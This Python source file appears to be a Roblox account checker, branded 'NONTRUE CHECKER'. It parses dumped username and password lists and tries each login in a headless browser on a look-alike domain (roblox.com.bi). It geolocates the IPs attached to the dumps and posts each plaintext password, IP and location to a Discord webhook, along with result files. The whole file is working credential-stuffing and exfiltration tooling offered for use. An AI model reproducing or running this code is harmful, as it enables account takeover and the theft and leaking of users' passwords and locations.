import subprocess
import sys
import asyncio
import os
import json
import requests
import re
import random
import time
from datetime import datetime
from io import BytesIO

def get_ip_info(ip):
    """Fetch detailed IP geolocation data using ip-api.com (free tier)"""
    try:
        # Free ip-api endpoint uses HTTP on non-pro plans.
        url = f"http://ip-api.com/json/{ip}"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') != 'success':
                raise ValueError(data.get('message', 'ip-api lookup failed'))
            return {
                'ip_address': data.get('query', ip),
                'country': data.get('country', 'N/A'),
                'state': data.get('regionName', 'N/A'),
                'city': data.get('city', 'N/A'),
                'postal': data.get('zip', 'N/A'),
                'asn': data.get('as', 'N/A'),
                'organization': data.get('org', 'N/A')
            }
    except Exception as e:
        print(f"[GEO ERROR] {ip}: {e}")
    return {
        'ip_address': ip,
        'country': 'N/A',
        'state': 'N/A',
        'city': 'N/A',
        'postal': 'N/A',
        'asn': 'N/A',
        'organization': 'N/A'
    }

# ==============================
# PLAYWRIGHT STATUS
# ==============================
PLAYWRIGHT_READY = False
PLAYWRIGHT_ERROR = None

def check_and_install_playwright():
    global PLAYWRIGHT_READY, PLAYWRIGHT_ERROR
    try:
        import playwright
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "playwright"])

    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            browser.close()
        PLAYWRIGHT_READY = True
    except Exception as e:
        PLAYWRIGHT_READY = False
        PLAYWRIGHT_ERROR = str(e)

check_and_install_playwright()
from playwright.async_api import async_playwright

# ==============================
# 1 AGENT ONLY
# ==============================
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

class RobloxAPI:
    def get_user_id(self, username):
        try:
            resp = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [username]}, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return data['data'][0]['id'] if data.get('data') else None
        except: pass
        return None

    def get_headshot(self, username):
        uid = self.get_user_id(username)
        if uid:
            resp = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return data['data'][0]['imageUrl'] if data.get('data') else None
        return None

# ==============================
# DISCORD WEBHOOK
# ==============================
class DiscordWebhook:
    def __init__(self, webhook_url=None):
        self.webhook_url = webhook_url
        self.roblox = RobloxAPI()

    def _post_with_retry(self, payload, max_retries=3):
        """Send webhook payload with basic retry on Discord rate limit (HTTP 429)."""
        for attempt in range(max_retries):
            try:
                response = requests.post(self.webhook_url, json=payload, timeout=10)
                if response.status_code != 429:
                    return response

                retry_after = 1.5
                try:
                    body = response.json()
                    retry_after = float(body.get('retry_after', retry_after))
                except Exception:
                    pass
                time.sleep(max(retry_after, 0.5))
            except Exception:
                if attempt == max_retries - 1:
                    raise
                time.sleep(1.0)
        return None

    def send(self, username, password, ip_data, status, message):
        if not self.webhook_url:
            return

        print(f"[WEBHOOK {status}] {username}")

        headshot = self.roblox.get_headshot(username)
        fields = [
            {"name": "ðŸ‘¤ Username", "value": f"```{username}```", "inline": True},
            {"name": "ðŸ”‘ Password", "value": f"```{password}```", "inline": True},
            {"name": "ðŸŒ IP Address", "value": f"```{ip_data.get('ip_address', 'N/A')}```", "inline": True},
            {"name": "ðŸ“ Country", "value": ip_data.get('country', 'N/A'), "inline": True},
            {"name": "ðŸ™ï¸ States", "value": ip_data.get('state', 'N/A'), "inline": True},
            {"name": "ðŸ™ï¸ City", "value": ip_data.get('city', 'N/A'), "inline": True},
            {"name": "ðŸ“® Postal", "value": ip_data.get('postal', 'N/A'), "inline": True},
            {"name": "ðŸ”§ ASN", "value": ip_data.get('asn', 'N/A'), "inline": True},
            {"name": "ðŸ¢ Organization", "value": ip_data.get('organization', 'N/A'), "inline": True},
            {"name": "ðŸ“Š Check Result", "value": f"**{message}**", "inline": False}
        ]

        embed = {
            "title": "âœ… ACCOUNT FOUND - VALID" if status == 'VALID' else f"{status} ACCOUNT",
            "color": 0x00FF00 if status == 'VALID' else 0xFF0000,
            "fields": fields,
            "footer": {"text": f"ROBLOX CHECKER â€¢ {datetime.now().strftime('%H:%M:%S')} â€¢ {datetime.now().strftime('%m/%d/%y')}"}
        }
        if headshot:
            embed["thumbnail"] = {"url": headshot}

        try:
            self._post_with_retry({"embeds": [embed]})
        except:
            pass

    def send_batch_summary(self, session_id, total, valid, invalid, error_count, valid_path=None, invalid_path=None):
        """Send final batch summary and optionally attach result files."""
        if not self.webhook_url:
            return

        embed = {
            "title": "NONTRUE CHECKER - BATCH FINISHED",
            "color": 0x3498DB,
            "fields": [
                {"name": "Session", "value": f"`{session_id}`", "inline": False},
                {"name": "Total", "value": str(total), "inline": True},
                {"name": "Valid", "value": str(valid), "inline": True},
                {"name": "Invalid", "value": str(invalid), "inline": True},
                {"name": "Error", "value": str(error_count), "inline": True}
            ],
            "footer": {"text": f"ROBLOX CHECKER • {datetime.now().strftime('%H:%M:%S')} • {datetime.now().strftime('%m/%d/%y')}"}
        }

        files = {}
        try:
            if valid_path and os.path.exists(valid_path):
                files["files[0]"] = (os.path.basename(valid_path), open(valid_path, "rb"), "text/plain")
            if invalid_path and os.path.exists(invalid_path):
                idx = "files[1]" if files else "files[0]"
                files[idx] = (os.path.basename(invalid_path), open(invalid_path, "rb"), "text/plain")

            if files:
                payload_json = json.dumps({"embeds": [embed]})
                response = requests.post(
                    self.webhook_url,
                    data={"payload_json": payload_json},
                    files=files,
                    timeout=20
                )
                if response.status_code == 429:
                    try:
                        retry_after = float(response.json().get("retry_after", 1.5))
                    except Exception:
                        retry_after = 1.5
                    time.sleep(max(retry_after, 0.5))
                    requests.post(
                        self.webhook_url,
                        data={"payload_json": payload_json},
                        files=files,
                        timeout=20
                    )
            else:
                self._post_with_retry({"embeds": [embed]})
        except Exception as e:
            print(f"[WEBHOOK SUMMARY ERROR] {e}")
        finally:
            for _, file_tuple in files.items():
                try:
                    file_tuple[1].close()
                except Exception:
                    pass

# ==============================
# PARSER
# ==============================
class AccountParser:
    @staticmethod
    def parse_raw(content):
        accounts = []
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')

        blocks = re.split(r'-{5,}', content)
        print(f"[PARSER] {len(blocks)} blocks")

        for block in blocks:
            block = block.strip()
            if not block: continue

            data = {}
            for line in block.split('\n'):
                if ':' in line:
                    key, value = line.split(':', 1)
                    data[key.strip().lower()] = value.strip()

            username = data.get('username', '')
            password = data.get('password', '')

            if username and password:
                accounts.append((username, password, data))
                print(f"[PARSER] {username}")

        print(f"[PARSER] âœ… {len(accounts)} accounts")
        return accounts

# ==============================
# CHECKER
# ==============================
class RobloxChecker:
    def __init__(self):
        self.url = "https://www.roblox.com.bi/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F965937348506%2Fprofil"
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None

    async def start(self):
        if self.browser and self.browser.is_connected():
            if not self.page or self.page.is_closed():
                self.page = await self.context.new_page()
            return

        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(headless=True)
        self.context = await self.browser.new_context(user_agent=USER_AGENT)
        self.page = await self.context.new_page()

    async def close(self):
        if self.context:
            await self.context.close()
            self.context = None
        if self.browser and self.browser.is_connected():
            await self.browser.close()
            self.browser = None
        if self.playwright:
            await self.playwright.stop()
            self.playwright = None
        self.page = None

    async def check(self, username, password):
        try:
            await self.start()

            # Reuse existing browser/page and navigate directly to the configured URL.
            print(f"    Opening URL: {self.url}")
            response = await self.page.goto(self.url, wait_until='load', timeout=60000)
            print(f"    Current URL: {self.page.url}")
            if response:
                print(f"    Navigation status: {response.status}")
            if (self.page.url or '').lower() == 'about:blank':
                raise RuntimeError(f"Navigation failed, page stayed on about:blank for {self.url}")
            await self.page.wait_for_timeout(3000)

            await self.page.fill('input[type="text"]', username)
            await self.page.fill('input[type="password"]', password)
            await self.page.click('#login-button')

            start_time = time.time()

            invalid_keywords = [
                    'incorrect username or password',
                    'incorrect',
                    'wrong username/password',
                    'wrong username or password',
                    'username or password is incorrect',
                    'invalid username or password',
                    'invalid credentials',
                    'password is incorrect'
                ]
            valid_keywords = [
                '2af',
                'crossdevice',
                'authentikator',
                # Comment out premature detection
                #'2-step verification',
                #'two-step verification',
                #'verification code',
                #'enter code',
                #'authenticator'
            ]

            # Poll until valid/invalid appears. If the loading spinner is still
            # visible, keep waiting instead of refreshing or returning early.
            poll_count = 0
            temporary_error_count = 0
            max_temporary_error_seconds = 60
            while True:
                poll_count += 1
                await self.page.wait_for_timeout(1000)

                if poll_count % 10 == 0:
                    print(f"    Still waiting ({poll_count}s)... waiting for valid/invalid signals")

                current_url = (self.page.url or '').lower()
                content = (await self.page.content()).lower()

                # Spinner means the website is still processing the login.
                # Wait until it disappears before deciding valid/invalid.
                spinner_visible = False
                try:
                    spinner_visible = await self.page.locator('.spinner.spinner-default').is_visible(timeout=300)
                except Exception:
                    spinner_visible = False
                if spinner_visible:
                    elapsed = time.time() - start_time
                    if elapsed > 120:
                        print(f"    Spinner timeout after 120s, refreshing page and skipping account")
                        await self.page.reload()
                        return {'status': 'TIMEOUT', 'message': 'Spinner persisted >120s, refreshed & skipped'}
                    print(f"    Loading spinner detected ({int(elapsed)}s), continuing to wait...")
                    continue

                error_text = ''
                try:
                    error = self.page.locator('#login-form-error')
                    if await error.is_visible(timeout=300):
                        error_text = (await error.text_content() or '').lower()
                except Exception:
                    error_text = ''

                combined = f"{content}\n{error_text}"
                has_invalid = any(k in combined for k in invalid_keywords) or 'an unknown error occurred. please try again' in combined
                has_valid = any(k in combined for k in valid_keywords)
                moved_to_challenge = any(
                    token in current_url for token in ['challenge', 'two-step', 'verification']
                )

                if 'an unknown error occurred. please try again' in combined:
                    temporary_error_count += 1
                    if temporary_error_count % 10 == 1:
                        print(f"    Temporary error detected ({temporary_error_count}s/{max_temporary_error_seconds}s), waiting without refreshing...")
                    if temporary_error_count >= max_temporary_error_seconds:
                        return {'status': 'ERROR', 'message': f'Temporary login error stayed for {max_temporary_error_seconds}s'}
                    continue
                temporary_error_count = 0

                if has_invalid:
                    return {'status': 'INVALID', 'message': 'Wrong username/password'}

                if has_valid:
                    print(f"    VALID detected (crossdevice/email 2SV), keeping browser open for next check...")
                    return {'status': 'VALID', 'message': '2SV (cross-device/email/app) detected - Valid account'}

                redirected_from_login = (
                    ('newlogin' not in current_url and 'login' not in current_url) and
                    any(token in current_url for token in ['users/', '/home', 'my/account', 'challenge', 'verify'])
                )
                if redirected_from_login and not has_invalid:
                    return {'status': 'VALID', 'message': 'Login redirected to account/challenge page'}

                if moved_to_challenge:
                    return {'status': 'VALID', 'message': 'Challenge/verification page detected'}

                continue
        except Exception as e:
            return {'status': 'ERROR', 'message': f'{str(e)[:80]}'}
        finally:
            # No close - persistent browser, refresh only
            pass

# ==============================
# NonTrueChecker
# ==============================
class NonTrueChecker:
    def __init__(self, session_id=None):
        import uuid
        self.session_id = session_id or str(uuid.uuid4())[:8]
        self.temp_dir = f'nontrue_checker_session_{self.session_id}'
        self.checker = RobloxChecker()
        os.makedirs(self.temp_dir, exist_ok=True)
        print(f"[SESSION] Created isolated session: {self.session_id}")

    def _build_report_content(self, entries, total_valid, total_invalid, total_error=0):
        lines = [
            "STIGMATOOLS",
            "------------------",
            "Nontrue Checker",
            "---------------------",
            f"Total valid [{total_valid}]",
            f"Total invalid [{total_invalid}]",
            f"Total error [{total_error}]",
            ""
        ]

        if not entries:
            lines.append("No data")
            lines.append("")
            return "\n".join(lines)

        for idx, item in enumerate(entries):
            lines.extend([
                f"username: {item.get('username', '')}",
                f"password: {item.get('password', '')}",
                f"ip address: {item.get('ip_address', 'N/A')}",
                f"country: {item.get('country', 'N/A')}",
                f"states: {item.get('state', 'N/A')}",
                f"city: {item.get('city', 'N/A')}",
                f"postal: {item.get('postal', 'N/A')}",
                f"asn: {item.get('asn', 'N/A')}",
                f"organisation: {item.get('organization', 'N/A')}",
                ""
            ])
            if idx < len(entries) - 1:
                lines.append("------------------------------")

        return "\n".join(lines)

    async def check_nontrue(self, account, webhook_url=None):
        if ':' not in account:
            return {'status': 'error', 'message': 'Format: username:password'}

        username, password = account.split(':', 1)
        try:
            result = await self.checker.check(username.strip(), password.strip())
        finally:
            await self.checker.close()

        if webhook_url and result['status'] == 'VALID':
            webhook = DiscordWebhook(webhook_url)
            webhook.send(username.strip(), password.strip(), {}, 'VALID', result['message'])

        return {'status': 'success', 'result': result}

    async def check_bulk_nontrue(self, content, webhook_url=None):
        accounts = AccountParser.parse_raw(content)

        valid_count = 0
        invalid_count = 0
        error_count = 0
        valid_lines = []
        invalid_lines = []
        valid_entries = []
        invalid_entries = []
        results = []
        webhook = DiscordWebhook(webhook_url) if webhook_url else None
        sent_webhook_keys = set()

        try:
            await self.checker.start()

            for username, password, ip_data in accounts:
                print(f"[{self.session_id}] [1-AGENT] Checking {username}")
                print(f"    IP: {ip_data.get('ip address', 'N/A')}")

                result = await self.checker.check(username, password)
                status = (result.get('status') or 'ERROR').upper()
                message = result.get('message', 'Unknown')
                print(f"    [{self.session_id}] RESULT: {status} - {message}")

                line = f"{username}:{password}"
                ip = ip_data.get('ip address', 'N/A')
                full_geo = get_ip_info(ip)
                ip_data.update(full_geo)

                if status == 'VALID':
                    valid_lines.append(line)
                    valid_entries.append({
                        'username': username,
                        'password': password,
                        'ip_address': full_geo.get('ip_address', 'N/A'),
                        'country': full_geo.get('country', 'N/A'),
                        'state': full_geo.get('state', 'N/A'),
                        'city': full_geo.get('city', 'N/A'),
                        'postal': full_geo.get('postal', 'N/A'),
                        'asn': full_geo.get('asn', 'N/A'),
                        'organization': full_geo.get('organization', 'N/A')
                    })
                    valid_count += 1
                    print("ACCOUNT FOUND - VALID")
                    print(f"Username: {username}")
                    print(f"IP: {full_geo.get('ip_address', 'N/A')} | Country: {full_geo.get('country', 'N/A')} | City: {full_geo.get('city', 'N/A')}")
                    print(f"Check Result: {message}")
                elif status == 'INVALID':
                    invalid_lines.append(line)
                    invalid_entries.append({
                        'username': username,
                        'password': password,
                        'ip_address': full_geo.get('ip_address', 'N/A'),
                        'country': full_geo.get('country', 'N/A'),
                        'state': full_geo.get('state', 'N/A'),
                        'city': full_geo.get('city', 'N/A'),
                        'postal': full_geo.get('postal', 'N/A'),
                        'asn': full_geo.get('asn', 'N/A'),
                        'organization': full_geo.get('organization', 'N/A')
                    })
                    invalid_count += 1
                    print(f"    [{self.session_id}] INVALID/ERROR {username} - {message}")
                else:
                    error_count += 1
                    print(f"    [{self.session_id}] ERROR {username} - {message}")

                if webhook:
                    send_key = f"{username}:{password}:{status}:{message}"
                    if send_key not in sent_webhook_keys:
                        webhook_status = status if status in ('VALID', 'INVALID', 'ERROR') else 'ERROR'
                        webhook.send(username, password, ip_data, webhook_status, message)
                        sent_webhook_keys.add(send_key)

                results.append({
                    'status': 'valid' if status == 'VALID' else ('invalid' if status == 'INVALID' else 'error'),
                    'username': username,
                    'password': password,
                    'message': message
                })
        finally:
            await self.checker.close()

        print(f"\nSUMMARY: {valid_count} VALID / {invalid_count} INVALID / {error_count} ERROR")

        # Save files
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        valid_file = f"valid_nontrue_{timestamp}.txt" if valid_count > 0 else None
        invalid_file = f"invalid_nontrue_{timestamp}.txt" if invalid_lines else None

        if valid_lines:
            with open(os.path.join(self.temp_dir, valid_file), 'w', encoding='utf-8') as f:
                f.write(self._build_report_content(valid_entries, valid_count, invalid_count, error_count))
            print(f"Saved {valid_file}")

        if invalid_lines:
            with open(os.path.join(self.temp_dir, invalid_file), 'w', encoding='utf-8') as f:
                f.write(self._build_report_content(invalid_entries, valid_count, invalid_count, error_count))
            print(f"Saved {invalid_file}")

        valid_path = os.path.join(self.temp_dir, valid_file) if valid_file else None
        invalid_path = os.path.join(self.temp_dir, invalid_file) if invalid_file else None

        if webhook:
            webhook.send_batch_summary(
                session_id=self.session_id,
                total=len(accounts),
                valid=valid_count,
                invalid=invalid_count,
                error_count=error_count,
                valid_path=valid_path,
                invalid_path=invalid_path
            )

        return {
            'status': 'success',
            'results': results,
            'total': len(accounts),
            'valid': valid_count,
            'invalid': invalid_count,
            'error': error_count,
            'summary': {
                'total': len(accounts),
                'valid': valid_count,
                'invalid': invalid_count,
                'error': error_count
            },
            'valid_file': valid_file,
            'invalid_file': invalid_file
        }
# Global instance
nontrue_checker = NonTrueChecker()
